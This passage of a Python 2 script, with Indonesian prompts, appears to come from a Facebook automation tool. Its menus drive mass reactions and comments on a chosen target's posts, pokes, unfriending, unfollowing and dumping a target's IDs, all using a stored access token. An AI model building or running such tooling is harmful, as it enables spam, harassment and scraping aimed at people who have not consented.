                print W + '[' + G + post['name'] + W + '] Perempuan'

        print '\x1b[31;1m[*] \x1b[32;1mSelesai'
        menu_bot()
        bot()
    except KeyboardInterrupt:
        print '\r\x1b[32;1m[!] \x1b[31;1mBerhenti  '
        menu_bot()
        bot()
    except requests.exceptions.ConnectionError:
        print '\x1b[32;1m[!] \x1b[31;1mKoneksi eror'
        menu_bot()
        bot()


def menu_reaction_ask():
    global type
    try:
        cek = raw_input(R + 'Menu-Bot' + W + '/' + R + 'Reaction' + W + ' ==> ')
        if cek in ('1', '1'):
            type = 'LIKE'
            bot_ask()
        elif cek in ('2', '2'):
            type = 'LOVE'
            bot_ask()
        elif cek in ('3', '3'):
            type = 'WOW'
            bot_ask()
        elif cek in ('4', '4'):
            type = 'HAHA'
            bot_ask()
        elif cek in ('5', '5'):
            type = 'SAD'
            bot_ask()
        elif cek in ('6', '6'):
            type = 'ANGRY'
            bot_ask()
        elif cek.lower() == '02':
            menu_reaction()
            menu_reaction_ask()
        elif cek.lower() == 'exit':
            print '\x1b[32;1m[!] \x1b[31;1mKeluar !!'
            sys.exit()
        elif cek.lower() == 'T':
            menu()
            main()
            sys.exit()
        elif cek.lower() == '001':
            try:
                open('cookie/token.log')
                print '\x1b[31;1m[!] \x1b[32;1mAccess token sudah ada'
                cek = raw_input('\rm[?] \x1b[32;1mApakan anda yakin ingin melanjutkan [Y/N] ')
                if cek.lower() != 'y':
                    print '\x1b[31;1m[*] Membatalkan '
                    bot()
            except IOError:
                pass

            print '\n' + ('\x1b[32;1m[*] Hasilkan Access token facebook [*]').center(44) + '\n'
            print '\x1b[31;1m[Warn] \x1b[32;1mMatikan VPN anda sebelum menggunakan fitur ini !!!'
            id()
        elif cek in ('0', '00'):
            print '\x1b[31;1m[!] \x1b[32;1mKembali ke Menu Bot'
            menu_bot()
            bot()
        elif cek == '':
            menu_reaction_ask()
        else:
            print "\x1b[31;1m[!] \x1b[32;1mPerintah '" + cek + "' Tidak ada"
            print "\x1b[31;1m[!] \x1b[32;1mPilih '0' untuk ke Menu bot"
            menu_reaction_ask()
    except KeyboardInterrupt:
        menu_reaction_ask()


def bot_ask():
    global WT
    global id
    global token
    print '\x1b[31;1m[*] \x1b[32;1mload access token '
    try:
        token = open('cookie/token.log', 'r').read()
        print '\x1b[31;1m[*] \x1b[32;1mMemuat Access token'
    except IOError:
        print '\x1b[31;1m[!] \x1b[32;1mFailed Memuat Access token'
        print '\x1b[31;1m[!] \x1b[32;1mSilahkan Login terlebih dahulu'
        menu_reaction_ask()

    WT = raw_input(W + '\x1b[32;1m[?] [' + R + 'W' + W + ']\x1b[32;1mallpost or [' + R + 'T' + W + ']\x1b[32;1marget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
    if WT.upper() == 'T':
        id = raw_input('\x1b[32;1m[?] id facebook : ')
        if id == '':
            print '\x1b[32;1m[!] \x1b[31;1mTarget id tidak boleh kosong'
            print '\x1b[32;1m[!] \x1b[31;1mBerhenti'
            menu_reaction_ask()
    else:
        WT = 'wallpost'
    like(post(), 50)


def bot():
    global WT
    global id
    global message
    global token
    try:
        cek = raw_input(R + 'Menu-Bot ' + W + '==> ')
        if cek in ('1', '01'):
            menu_reaction()
            menu_reaction_ask()
        elif cek in ('2', '02'):
            print '\x1b[31;1m[*] \x1b[32;1mMemuat access token'
            try:
                token = open('cookie/token.log', 'r').read()
                print '\x1b[31;1m[*] \x1b[32;1mBerhasil memuat access token'
            except IOError:
                print '\x1b[31;1m[!] Gagal memuat access token'
                print '\x1b[31;1m[!] Silahkan login terlebih dahulu'
                bot()

            WT = raw_input(W + '\x1b[32;1m[?] [' + R + 'W' + W + ']\x1b[32;1mallpost or [' + R + 'T' + W + ']\x1b[32;1marget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
            if WT.lower() == 'w' or WT.lower() == '':
                WT = 'wallpost'
            else:
                id = raw_input('\x1b[31;1m[?] \x1b[32;1mId Target : ')
                if id == '':
                    print '\x1b[32;1m[!] \x1b[31;1mid target tidak boleh kosong'
                    print '\x1b[32;1m[!] \x1b[31;1mBerhenti'
                    bot()
            print '--------------------------------------------------'
            print "  \x1b[31;1m[Note] \x1b[32;1mGunakan simbol '</>' Untuk mengubah baris\n"
            message = raw_input('\x1b[32;1m[?] Pesanmu : ')
            if message == '':
                print '\x1b[32;1m[!] \x1b[31;1mPesan tidak boleh kosong'
                print '\x1b[32;1m[!] \x1b[31;1mBerhenti'
                bot()
            else:
                message = message.replace('</>', '\n')
            comment(post(), 50)
        elif cek in ('4', '04'):
            WT = 'req'
            print '\x1b[31;1m[*] \x1b[32;1mMemuat access token    '
            try:
                token = open('cookie/token.log', 'r').read()
                print '\x1b[31;1m[*] \x1b[32;1mBerhasil memuat access token'
            except IOError:
                print '\x1b[31;1m[!] Gagal memuat access token   '
                print '\x1b[31;1m[!] Silahkan login terlebih dahulu'
                bot()

            confirm(post())
        elif cek in ('3', '03'):
            WT = 'wallpost'
            print '\x1b[31;1m[*] \x1b[32;1mMemuat access token    '
            try:
                token = open('cookie/token.log', 'r').read()
                print '\x1b[31;1m[*] \x1b[32;1mBerhasil memuat access token'
            except IOError:
                print '\x1b[31;1m[!] Gagal memuat access token'
                print '\x1b[31;1m[!] Silahkan login terlebih dahulu'
                bot()

            poke(post())
        elif cek in ('5', '05'):
            WT = 'me'
            print '\x1b[31;1m[*] \x1b[32;1mMemuat access token    '
            try:
                token = open('cookie/token.log', 'r').read()
                print '\x1b[31;1m[*] \x1b[32;1mBerhasil Memuat access token'
            except IOError:
                print '\x1b[31;1m[!] Gagal memuat access token'
                print '\x1b[31;1m[!] Silahkan login terlebih dahulu'
                bot()

            remove(post())
        elif cek in ('6', '06'):
            WT = 'friends'
            print '\x1b[31;1m[*] \x1b[32;1mMemuat access token     '
            try:
                token = open('cookie/token.log', 'r').read()
                print '\x1b[31;1m[*] \x1b[32;1mBerhasil memuat access token'
            except IOError:
                print '\x1b[31;1m[!] \x1b[32;1mGagal memuat access token'
                print '\x1b[31;1m[!] \x1b[32;1mSilahkan login terlebih dahulu'
                bot()

            unfriend(post())
        elif cek in ('7', '07'):
            WT = 'subs'
            print '\x1b[31;1m[*] \x1b[32;1mMemuat access token      '
            try:
                token = open('cookie/token.log', 'r').read()
                print '\x1b[31;1m[*] \x1b[32;1mBerhasil memuat access token'
            except IOError:
                print '\x1b[31;1m[!] \x1b[32;1mGagal memuat access token'
                print '\x1b[31;1m[!] \x1b[32;1mSilahkan login terlebih dahulu'
                bot()

            unfollow(post())
        elif cek in ('8', '08'):
            WT = 'albums'
            print '\x1b[31;1m[*] \x1b[32;1mMemuat access token      '
            try:
                token = open('cookie/token.log', 'r').read()
                print '\x1b[31;1m[*] \x1b[32;1mBerhasil memuat access token'
            except IOError:
                print '\x1b[31;1m[!] \x1b[32;1mGagal memuat access token'
                print '\x1b[31;1m[!] \x1b[32;1mSilahkan login terlebih dahulu'

            albums(post())
        elif cek in ('0', '00'):
            menu()
            main()
        elif cek.lower() == '002':
            menu_bot()
            bot()
        elif cek.lower() == '000':
            print '\x1b[31;1m[!] Keluar'
            sys.exit()
        elif cek.lower() == '001':
            try:
                open('cookie/token.log')
                print '\x1b[31;1m[!] \x1b[32;1mAccess token Sudah ada'
                cek = raw_input('\x1b[31;1m[?] \x1b[32;1mApakah anda yakin ingin melanjutkan [Y/N] ')
                if cek.lower() != 'y':
                    print '\x1b[32;1m[*] \x1b[31;1mMembatalkan '
                    bot()
            except IOError:
                pass

            print '\n' + ('\x1b[31;1m[*] \x1b[32;1mHasilkan acces token facebook [*]').center(44) + '\n'
            print '\x1b[31;1m[Warn] \x1b[32;1mMatikan VPN anda sebelum menggunakan fitur ini !!!'
            id()
        elif cek == '':
            bot()
        else:
            print "\x1b[31;1m[!] \x1b[32;1mPerintah '" + cek + "' Tidak ada"
            print '\x1b[31;1m[!] \x1b[32;1mMasukan dengan benar'
            bot()
    except KeyboardInterrupt:
        menu_bot()
        bot()


def man():
    global target_id
    try:
        cek = raw_input(R + 'Menu-Bot' + W + ' ==> ')
        if cek.lower() == 'T':
            menu_bot()
            bot()
            try:
                o = open('cookie/token.log', 'r').read()
                print '\x1b[31;1m[*] \x1b[32;1mToken akses anda !!\n\n' + o + '\n'
                main()
            except IOError:
                print '\x1b[31;1m[!] \x1b[32;1mGagal membuka cookie/token.log'
                print '\x1b[31;1m[!] \x1b[32;1mSilahkan login terlebih dahulu'
                main()

        elif cek.lower() == 'Y':
            try:
                open('cookie/token.log')
                print '\x1b[32;1m[!] Access token sudah ada'
                cek = raw_input('\x1b[32;1m[?] Apakah anda yakin ingin melanjutkan [Y/N] ')
                if cek.lower() != 'y':
                    print '\x1b[31;1m[*] Membatalkan '
                    bot()
            except IOError:
                pass

            print '\n' + ('\x1b[32;1m[*] Hasilkan Accses token facebook [*]').center(44) + '\n'
            print '\x1b[31;1m[Warn] Matikan VPN anda sebelum menggunakan fitur ini !!!'
            id()
        elif cek.lower() == 'rm_token':
            print '\n33[31;1m[Warn] Anda harus membuat Accses token lagi jika \n       acces token anda dihapus\n'
            a = raw_input("\x1b[31;1m[!] \x1b[32;1mKetik 'delete' Untuk melanjutkan : ")
            if a.lower() == 'delete':
                try:
                    os.system('rm -rf cookie/token.log')
                    print '\x1b[32;1m[*] \x1b[32;1mBerhasil di hapus cookie/token.log'
                    main()
                except OSError:
                    print '\x1b[31;1m[*] Gagal dihapus cookie/token.log'
                    main()

            else:
                print '\x1b[31;1m[*] Gagal dihapus cookie/token.log'
                main()
        elif cek.lower() == '000':
            print '\x1b[31;1m[!] \x1b[31;1mKeluar'
            print '\x1b[31;1m[!] \x1b[36;1mTerima Kasih'
            sys.exit()
        if 'dump_' in cek.lower() and cek.lower().split('_')[2] == 'id':
            target_id = cek.lower().split('_')[1]
            dump_id_id()
        elif cek == '':
            main()
        else:
            print "\x1b[31;1m[!] Perintah '" + cek + "' Tidak ada"
            print '\x1b[31;1m[!] Masukan dengan benar'
            main()
    except KeyboardInterrupt:
        main()
    except IndexError:
        print '\x1b[31;1m[!] \x1b[32;1mParameter pada perintah tidak valid : ' + cek
        main()


if __name__ == '__main__':
    menu_bot()
    bot()
    main()